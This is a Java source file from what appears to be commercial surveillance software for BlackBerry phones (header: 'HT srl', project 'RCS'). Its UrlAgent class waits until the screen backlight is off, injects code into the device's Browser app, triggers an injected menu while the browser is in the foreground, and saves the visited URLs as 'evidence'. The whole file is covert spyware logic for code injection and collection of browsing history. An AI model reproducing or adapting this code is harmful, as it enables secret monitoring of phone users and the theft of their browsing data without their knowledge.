//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import net.rim.device.api.system.Backlight;
import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceType;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class UrlAgent.
 */
public final class UrlAgent extends Agent implements ApplicationObserver,
        BacklightObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
    //#endif

    String appName = "Browser";

    AppInjector applicationInjector;
    //Timer applicationTimer;
    private static final long APP_TIMER_PERIOD = 1000;

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public UrlAgent(final boolean agentEnabled) {
        super(Agent.AGENT_URL, agentEnabled  , true, "UrlAgent");
        
        //#ifdef URL_FORCED
        enable(true);
        //#endif
    }

    /**
     * Instantiates a new url agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addApplicationObserver(this);
        AppListener.getInstance().addBacklightObserver(this);

        try {
            applicationInjector = new AppInjector(AppInjector.APP_BROWSER);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " +ex);
            //#endif
        }

        if (!applicationInjector.isInfected() && !Backlight.isEnabled()) {
            menuInject();
        }
    }

    private void menuInject() {
        //#ifdef DEBUG
        debug.trace("menuInject");
        //#endif
        
        applicationInjector.infect();

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif
        
        AppListener.getInstance().removeApplicationObserver(this);
        AppListener.getInstance().removeBacklightObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        if (applicationInjector.isInfected() && Backlight.isEnabled() && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif
            
            applicationInjector.callMenuInContext();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif
        return true;
    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }

    }

    public void onBacklightChange(boolean on) {
        if (!on && !applicationInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif
            menuInject();
        }
    }

    public synchronized void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl: " + url);
        //#endif
        evidence.createEvidence(null, EvidenceType.CHAT);
        evidence.writeEvidence(WChar.getBytes(url, true));
        evidence.close();
    }

}
